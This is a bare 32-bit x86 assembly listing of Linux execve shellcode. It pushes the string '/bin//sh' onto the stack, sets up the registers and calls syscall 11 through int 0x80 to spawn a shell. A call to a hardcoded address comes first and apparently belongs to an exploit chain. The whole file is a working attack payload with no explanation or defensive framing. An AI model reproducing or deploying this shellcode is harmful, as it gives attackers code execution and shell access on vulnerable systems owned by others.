BITS 32
    call 0xfff5bdf7
    ret
    xor eax,eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov ecx, eax
    mov edx, eax
    mov al, 0x0b
    int 0x80

